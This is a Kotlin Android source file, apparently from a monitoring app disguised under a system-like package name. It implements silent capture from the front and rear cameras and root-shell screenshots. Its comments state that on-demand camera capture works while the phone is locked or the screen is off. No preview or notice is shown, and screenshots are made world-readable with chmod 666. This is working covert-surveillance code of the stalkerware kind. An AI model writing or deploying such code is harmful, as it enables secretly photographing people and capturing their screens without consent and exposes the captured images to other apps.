package com.system.superiormonitor.core

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import kotlin.coroutines.resume

object CaptureHelper {

    /**
     * Executes an immediate or scheduled capture and handles lock screen rules.
     * @param type 0 = Screen, 1 = Front, 2 = Rear
     * @param isScheduled true if triggered by alarm (fails if locked), false if on-demand
     * @return Pair<Boolean, String> - (isSuccess, errorMessage)
     */
    suspend fun performCapture(context: Context, type: Int, isScheduled: Boolean, destFile: File): Pair<Boolean, String> {
        val keyguardManager = context.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val isLocked = keyguardManager.isKeyguardLocked
        val isScreenOn = powerManager.isInteractive

        val isScreenshot = type == 0
        // Rules:
        // 1. Scheduled (Screenshot, Front, Rear) -> fails if locked or screen off
        // 2. On-Demand Screenshot -> fails if locked or screen off
        // 3. On-Demand Camera -> works even if locked or screen off
        
        val needsUnlockedScreen = isScheduled || isScreenshot
        
        if (needsUnlockedScreen && (isLocked || !isScreenOn)) {
            return Pair(false, "Capture skipped/aborted: Screen is locked or off.")
        }
        
        if (isScreenshot) {
            val result = com.topjohnwu.superuser.Shell.cmd("screencap -p ${destFile.absolutePath} && chmod 666 ${destFile.absolutePath}").exec()
            return if (result.isSuccess) {
                Pair(true, "")
            } else {
                Pair(false, result.err.joinToString("\n"))
            }
        } else {
            val success = captureCamera(context, type, destFile)
            return if (success) {
                Pair(true, "")
            } else {
                Pair(false, "Internal camera capture failed.")
            }
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun captureCamera(context: Context, facing: Int, outputFile: File): Boolean = suspendCancellableCoroutine { continuation ->
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        var cameraDevice: CameraDevice? = null
        var imageReader: ImageReader? = null
        var previewReader: ImageReader? = null
        var backgroundThread: HandlerThread? = null
        var backgroundHandler: Handler? = null

        fun cleanup() {
            try {
                cameraDevice?.close()
                imageReader?.close()
                previewReader?.close()
                backgroundThread?.quitSafely()
                backgroundThread?.join(1000)
            } catch (e: Exception) {
                // Ignore cleanup errors
            }
        }

        val isResumed = java.util.concurrent.atomic.AtomicBoolean(false)
        fun finishWithResult(success: Boolean) {
            cleanup()
            if (isResumed.compareAndSet(false, true)) {
                if (continuation.isActive) {
                    continuation.resume(success)
                }
            }
        }

        try {
            backgroundThread = HandlerThread("SilentCameraBackground").apply { start() }
            backgroundHandler = Handler(backgroundThread!!.looper)

            val desiredFacing = if (facing == 1) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            var targetCameraId: String? = null

            var sensorOrientation = 0

            for (cameraId in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(cameraId)
                val lensFacing = chars.get(CameraCharacteristics.LENS_FACING)
                if (lensFacing != null && lensFacing == desiredFacing) {
                    targetCameraId = cameraId
                    sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
                    break
                }
            }

            if (targetCameraId == null) {
                LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Could not find requested camera.")
                finishWithResult(false)
                return@suspendCancellableCoroutine
            }

            cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        // High-res reader for final capture
                        imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
                        imageReader?.setOnImageAvailableListener({ reader ->
                            try {
                                val image = reader.acquireLatestImage()
                                val buffer: ByteBuffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.capacity())
                                buffer.get(bytes)

                                FileOutputStream(outputFile).use { output ->
                                    output.write(bytes)
                                }
                                LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Image taken and saved to ${outputFile.name}")
                                image.close()
                                finishWithResult(true)
                            } catch (e: Exception) {
                                LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Capture error: ${e.message}", LogLevel.ERROR)
                                finishWithResult(false)
                            }
                        }, backgroundHandler)

                        // Low-res dummy reader to trigger Auto-Exposure / Auto-White-Balance pipeline
                        previewReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 1)
                        previewReader?.setOnImageAvailableListener({ reader ->
                            reader.acquireLatestImage()?.close() // Discard frames, just keep stream alive
                        }, backgroundHandler)

                        val surfaces = listOf(imageReader!!.surface, previewReader!!.surface)

                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    // 1. Start continuous preview to warm up AE/AWB
                                    val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                    previewBuilder.addTarget(previewReader!!.surface)
                                    previewBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                    previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON)
                                    previewBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CameraMetadata.CONTROL_AWB_MODE_AUTO)
                                    
                                    session.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler)

                                    // 2. Wait 2 seconds for the sensor to gather light
                                    backgroundHandler!!.postDelayed({
                                        try {
                                            // 3. Trigger actual high-res JPEG capture
                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                            captureBuilder.addTarget(imageReader!!.surface)
                                            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                            captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)

                                            session.capture(captureBuilder.build(), null, backgroundHandler)
                                        } catch (e: Exception) {
                                            LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Final capture failed: ${e.message}", LogLevel.ERROR)
                                            finishWithResult(false)
                                        }
                                    }, 2000)

                                } catch (e: CameraAccessException) {
                                    LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Capture request failed: ${e.message}", LogLevel.ERROR)
                                    finishWithResult(false)
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Session configuration failed.", LogLevel.ERROR)
                                finishWithResult(false)
                            }
                        }, backgroundHandler)

                    } catch (e: Exception) {
                        LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Failed to setup capture: ${e.message}", LogLevel.ERROR)
                        finishWithResult(false)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Camera device disconnected during operation.", LogLevel.ERROR)
                    finishWithResult(false)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Fatal camera device error (code: $error)", LogLevel.ERROR)
                    finishWithResult(false)
                }
            }, backgroundHandler)

            // Add a safety timeout
            backgroundHandler!!.postDelayed({
                if (continuation.isActive) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Capture timed out (10s limit reached).", LogLevel.ERROR)
                    finishWithResult(false)
                }
            }, 10000)

        } catch (e: Exception) {
            LogManager.log(LogCategory.SNAPSHOTS, "[Camera] Initialization Error: ${e.message}", LogLevel.ERROR)
            finishWithResult(false)
        }
        
        continuation.invokeOnCancellation {
            cleanup()
        }
    }
}
